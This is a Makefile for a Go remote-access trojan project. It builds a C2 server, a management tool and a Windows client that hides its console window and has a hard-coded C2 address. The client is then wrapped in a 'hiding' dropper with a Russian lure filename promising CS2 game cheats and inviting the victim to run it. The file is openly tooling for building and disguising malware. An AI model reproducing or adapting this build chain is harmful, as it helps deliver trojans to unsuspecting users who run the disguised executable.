.PHONY: all proto clean

all: proto build-linux build-windows-n-hide

# айпи поменять на свой, порт тот же
C2_IP = 192.168.1.182:50051

proto:
	protoc --go_out=. --go_opt=paths=source_relative \
       --go-grpc_out=. --go-grpc_opt=paths=source_relative \
       internal/proto/service.proto

build-linux:
	mkdir -p build
	go build -o build/c2 ./cmd/c2
	go build -o build/mgmt ./cmd/mgmt

build-windows:
	mkdir -p build
	GOOS=windows GOARCH=amd64 go build -ldflags="-H=windowsgui -s -w -X 'main.C2=$(C2_IP)'" -o build/client.exe ./cmd/client/main_windows.go

build-windows-n-hide: build-windows
	cp build/client.exe cmd/hiding/
	GOOS=windows GOARCH=amd64 go build -o "build/трояны без читов кс2 много запусти меня.exe" ./cmd/hiding/main.go

clean:
	rm -rf build internal/proto/*.pb.go cmd/hiding/*.exe